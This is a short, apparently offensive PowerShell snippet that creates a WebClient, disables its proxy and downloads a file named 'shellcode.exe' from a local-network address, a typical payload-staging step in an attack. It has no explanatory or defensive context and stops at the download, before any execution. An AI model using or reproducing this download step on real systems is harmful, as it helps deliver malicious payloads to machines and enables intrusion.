$webClient = New-Object Net.WebClient 
$webClient.proxy = $null 
$webClient.DownloadFile("http://192.168.0.1/shellcode.exe", "shellcode.exe")